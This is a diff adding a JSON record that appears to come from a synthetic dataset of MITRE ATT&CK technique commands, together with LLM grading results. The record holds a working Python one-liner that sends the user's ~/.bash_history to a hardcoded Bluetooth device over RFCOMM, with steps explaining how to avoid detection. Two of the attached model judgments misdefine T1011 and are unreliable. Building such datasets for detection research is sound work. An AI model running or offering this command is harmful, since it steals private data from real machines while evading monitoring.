@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Uses Bluetooth RFCOMM channel 27 to move shell history data outside the normal IP stack, consistent with T1011 exfiltration over other network mediums.",
+  "rationale_steps": [
+    "Choose Bluetooth (RFCOMM) to avoid IP-based monitoring.",
+    "Connect to an uncommon RFCOMM channel (27) to reduce detection.",
+    "Read and send ~/.bash_history over the RFCOMM socket.",
+    "Terminate connection cleanly to leave minimal indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-dde69e91",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced quotes, parentheses, and proper syntax for imports, socket creation, connection, file reading, and data transmission.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over an alternative network medium (Bluetooth) as described in T1011, though it requires the target Bluetooth device to be paired and in range, and channel 27 may not be available on all devices.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:46:51.828535Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The python3 -c string is properly quoted and comprises valid Python statements with balanced parentheses and correct semicolon separation.",
+        "semantic_score": 1,
+        "semantic_justification": "While it exfiltrates data over Bluetooth, it targets a static address and performs no algorithmic endpoint selection or DNS-based rotation, so it does not implement Dynamic Resolution as defined.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:47:24.339651Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes and parentheses, valid module imports, correct method calls, and proper use of semicolons as statement separators.",
+        "semantic_score": 1,
+        "semantic_justification": "The command connects to a hardcoded Bluetooth MAC address and channel, which directly contradicts the core concept of T1011 (Dynamic Resolution), as it does not involve algorithmically determining network endpoints at runtime.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:58:41.576809Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
